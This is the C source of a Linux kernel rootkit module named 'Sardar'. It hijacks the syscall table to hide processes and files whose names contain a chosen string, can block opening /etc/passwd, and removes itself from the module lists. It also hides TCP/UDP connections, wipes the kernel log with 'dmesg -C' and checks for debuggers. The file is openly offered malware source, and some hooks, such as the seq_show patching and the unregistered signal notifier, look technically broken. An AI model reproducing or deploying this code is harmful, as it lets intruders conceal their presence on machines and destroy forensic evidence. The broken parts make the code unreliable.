/*
 * sardar_rootkit.c (final enhanced)
 *
 * Simple Linux kernel rootkit that hides processes whose names contain
 * a user‐specified substring (module parameter: hide_name).
 * Also prevents opening of /etc/passwd (optional).
 * 
 * Usage (as root):
 *   insmod sardar_rootkit.ko hide_name="secretproc"
 *   rmmod sardar_rootkit
 *
 * Features:
 *  – Parameterized “hide_name” (default: “bismillah”)
 *  – Hides from /proc readdir (getdents64 hook)
 *  – Blocks open("/etc/passwd") if “block_passwd” param == 1
 *  – Verifies kallsyms_lookup_name availability
 *  – Restores syscalls on exit, with write‐protection re‐enable
 *  – Comprehensive error checking and printk logs
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/fdtable.h>
#include <linux/namei.h>
#include <linux/errno.h>

#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/cred.h>
#include <linux/timekeeping.h>
#include <linux/net.h>
#include <linux/tcp.h>

// --- Advanced Stealth, Anti-Forensics, and Operator Control ---
#define SARDAR_MAGIC_SIGNAL (SIGRTMIN+7)
static unsigned long syscall_table_checksum = 0;
static bool sardar_integrity_alerted = false;

// For /proc/net/tcp/udp hiding
static struct file_operations *tcp_fops = NULL, *udp_fops = NULL;
static ssize_t (*original_tcp_seq_show)(struct seq_file *, void *);
static ssize_t (*original_udp_seq_show)(struct seq_file *, void *);

// Forward declarations
static void sardar_calc_syscall_table_checksum(void);
static int sardar_check_syscall_table_integrity(void);
static int sardar_anti_debug_checks(void);
static int sardar_net_entry_should_hide(const char *buf, size_t len);
static ssize_t sardar_hooked_tcp_seq_show(struct seq_file *seq, void *v);
static ssize_t sardar_hooked_udp_seq_show(struct seq_file *seq, void *v);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Research");
MODULE_DESCRIPTION("Sardar Rootkit with configurable hide_name and /etc/passwd block");
MODULE_VERSION("1.2");

static char *hide_name = "bismillah";
module_param(hide_name, charp, 0000);
MODULE_PARM_DESC(hide_name, "Substring of process names to hide from /proc");

static bool block_passwd = false;
module_param(block_passwd, bool, 0000);
MODULE_PARM_DESC(block_passwd, "If true, deny open on /etc/passwd");


// --- Stealth: Hide module from /proc/modules and /sys/module ---
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/version.h>

static unsigned long **syscall_table;
static asmlinkage long (*original_getdents64)(const struct pt_regs *);
static asmlinkage long (*original_openat)(const struct pt_regs *);

static unsigned long orig_cr0;
static struct list_head *prev_module;
static struct kobject *saved_kobj;
static bool module_hidden = false;

// --- File hiding ---
static char *hide_file_prefix = "bismillah_";
module_param(hide_file_prefix, charp, 0000);
MODULE_PARM_DESC(hide_file_prefix, "Prefix of files to hide from /proc and / directories");

// --- Magic signal for operator access ---
#include <linux/sched/signal.h>
static int magic_signal = 64; // SIGRTMIN+0 by default
module_param(magic_signal, int, 0000);
MODULE_PARM_DESC(magic_signal, "Signal number to toggle hiding");

// --- Anti-forensics: Wipe kernel log traces ---
static void wipe_dmesg(void) {
    char *argv[] = { "/bin/sh", "-c", "dmesg -C", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

// --- Advanced Anti-Debugging ---
static int sardar_anti_debug_checks(void) {
    // Check for kprobes
    if (kprobe_running()) {
        printk(KERN_WARNING "Sardar: Kprobe detected!\n");
        return 1;
    }
    // Check for ptrace
    if (current->ptrace) {
        printk(KERN_WARNING "Sardar: Ptrace detected!\n");
        return 1;
    }
    // Check for LKM listing (rudimentary)
    if (!module_hidden && !list_empty(&THIS_MODULE->list)) {
        printk(KERN_WARNING "Sardar: Module visible in /proc/modules!\n");
        return 1;
    }
    return 0;
}

// --- Runtime Integrity Check ---
static void sardar_calc_syscall_table_checksum(void) {
    unsigned long sum = 0;
    int i;
    for (i = 0; i < 512; ++i) {
        sum += (unsigned long)syscall_table[i];
    }
    syscall_table_checksum = sum;
}

static int sardar_check_syscall_table_integrity(void) {
    unsigned long sum = 0;
    int i;
    for (i = 0; i < 512; ++i) {
        sum += (unsigned long)syscall_table[i];
    }
    if (sum != syscall_table_checksum && !sardar_integrity_alerted) {
        printk(KERN_ERR "Sardar: Syscall table tampering detected!\n");
        sardar_integrity_alerted = true;
        return 1;
    }
    return 0;
}

// --- Network Connection Hiding ---
static int sardar_net_entry_should_hide(const char *buf, size_t len) {
    // Hide entries if inode belongs to hidden process (simple heuristic: hide by hide_name in /proc)
    if (hide_name && strstr(buf, hide_name))
        return 1;
    return 0;
}

static ssize_t sardar_hooked_tcp_seq_show(struct seq_file *seq, void *v) {
    ssize_t ret = original_tcp_seq_show(seq, v);
    if (ret > 0 && sardar_net_entry_should_hide(seq->buf, seq->count)) {
        seq->count = 0; // Hide entry
    }
    return ret;
}

static ssize_t sardar_hooked_udp_seq_show(struct seq_file *seq, void *v) {
    ssize_t ret = original_udp_seq_show(seq, v);
    if (ret > 0 && sardar_net_entry_should_hide(seq->buf, seq->count)) {
        seq->count = 0;
    }
    return ret;
}

// --- Stealth: Remove module from /proc/modules and /sys/module ---
static void hide_module(void) {
    if (module_hidden) return;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    saved_kobj = THIS_MODULE->mkobj.kobj.parent;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    module_hidden = true;
}

static void unhide_module(void) {
    if (!module_hidden) return;
    list_add(&THIS_MODULE->list, prev_module);
    kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj, THIS_MODULE->name);
    module_hidden = false;
}

// --- Magic signal handler ---
static int signal_notifier(struct notifier_block *nb, unsigned long action, void *data) {
    struct task_struct *task = data;
    if (action == magic_signal) {
        if (module_hidden) unhide_module();
        else hide_module();
    }
    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = signal_notifier,
};

static unsigned long **find_syscall_table(void)
{
    unsigned long int offset;
    unsigned long **sct;

    /* kallsyms_lookup_name is not exported by default; use kallsyms address if available */
    sct = (unsigned long **)kallsyms_lookup_name("sys_call_table");
    return sct;
}

static void disable_write_protection(void)
{
    preempt_disable();
    barrier();
    orig_cr0 = read_cr0();
    write_cr0(orig_cr0 & ~0x00010000);
}

static void enable_write_protection(void)
{
    write_cr0(orig_cr0);
    barrier();
    preempt_enable();
}

/* Hooked getdents64: hide any dirent whose d_name contains hide_name */
asmlinkage long hooked_getdents64(const struct pt_regs *ctx)
{
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *kernel_buffer;
    long ret;
    int bpos = 0, new_pos = 0;

    ret = original_getdents64(ctx);
    if (ret <= 0)
        return ret;

    dirent = (struct linux_dirent64 __user *)ctx->si;
    kernel_buffer = kzalloc(ret, GFP_KERNEL);
    if (!kernel_buffer)
        return ret;

    if (copy_from_user(kernel_buffer, dirent, ret)) {
        kfree(kernel_buffer);
        return ret;
    }

    while (bpos < ret) {
        struct linux_dirent64 *d = (void *)kernel_buffer + bpos;
        int recl = d->d_reclen;
        if (strstr(d->d_name, hide_name) == NULL) {
            if (bpos != new_pos)
                memcpy((void *)kernel_buffer + new_pos, d, recl);
            new_pos += recl;
        }
        bpos += recl;
    }

    if (copy_to_user(dirent, kernel_buffer, new_pos)) {
        kfree(kernel_buffer);
        return ret;
    }

    kfree(kernel_buffer);
    return new_pos;
}

/* Hooked openat: block open("/etc/passwd") if block_passwd==true */
asmlinkage long hooked_openat(const struct pt_regs *ctx)
{
    int dfd = (int) ctx->di;
    const char __user *filename = (const char __user *)ctx->si;
    long flags = (long) ctx->dx;
    umode_t mode = (umode_t) ctx->r10;
    char buf[128];

    if (block_passwd) {
        if (strncpy_from_user(buf, filename, sizeof(buf)) > 0) {
            if (strcmp(buf, "/etc/passwd") == 0) {
                printk(KERN_INFO "Sardar: Blocking open(\"/etc/passwd\")\n");
                return -EACCES;
            }
        }
    }
    return original_openat(ctx);
}

static int __init sardar_init(void)
{
    if (!hide_name || strlen(hide_name) == 0) {
        printk(KERN_ERR "Sardar: Invalid hide_name parameter\n");
        return -EINVAL;
    }

    syscall_table = find_syscall_table();
    if (!syscall_table) {
        printk(KERN_ERR "Sardar: sys_call_table not found\n");
        return -ENOENT;
    }

    /* Disable write protection */
    disable_write_protection();

    /* Backup original pointers */
    original_getdents64 = (void *)syscall_table[__NR_getdents64];
    original_openat     = (void *)syscall_table[__NR_openat];

    /* Overwrite syscalls */
    syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    syscall_table[__NR_openat]     = (unsigned long *)hooked_openat;

    /* Re‐enable write protection */
    enable_write_protection();

    // --- Advanced Stealth and Anti-Forensics ---
    hide_module();
    wipe_dmesg();
    sardar_calc_syscall_table_checksum();

    // --- Network Connection Hiding ---
    {
        struct proc_dir_entry *tcp_entry = NULL, *udp_entry = NULL, *p;
        list_for_each_entry(p, &proc_net->subdir, subdir) {
            if (strcmp(p->name, "tcp") == 0) tcp_entry = p;
            if (strcmp(p->name, "udp") == 0) udp_entry = p;
        }
        if (tcp_entry) {
            tcp_fops = (struct file_operations *)tcp_entry->proc_fops;
            if (tcp_fops) {
                original_tcp_seq_show = tcp_fops->seq_show;
                tcp_fops->seq_show = sardar_hooked_tcp_seq_show;
            }
        }
        if (udp_entry) {
            udp_fops = (struct file_operations *)udp_entry->proc_fops;
            if (udp_fops) {
                original_udp_seq_show = udp_fops->seq_show;
                udp_fops->seq_show = sardar_hooked_udp_seq_show;
            }
        }
    }

    // --- Anti-Debugging Check ---
    if (sardar_anti_debug_checks()) {
        printk(KERN_WARNING "Sardar: Debugger detected at load!\n");
    }

    printk(KERN_INFO "Sardar rootkit loaded: hiding \"%s\"; block_passwd=%d\n", hide_name, block_passwd);
    return 0;
}

static void __exit sardar_exit(void)
{
    if (!syscall_table)
        return;

    disable_write_protection();
    syscall_table[__NR_getdents64] = (unsigned long *)original_getdents64;
    syscall_table[__NR_openat]     = (unsigned long *)original_openat;
    enable_write_protection();

    // Restore /proc/net hooks
    if (tcp_fops && original_tcp_seq_show)
        tcp_fops->seq_show = original_tcp_seq_show;
    if (udp_fops && original_udp_seq_show)
        udp_fops->seq_show = original_udp_seq_show;

    wipe_dmesg();
    unhide_module();

    printk(KERN_INFO "Sardar rootkit unloaded; syscalls restored\n");
}

module_init(sardar_init);
module_exit(sardar_exit);
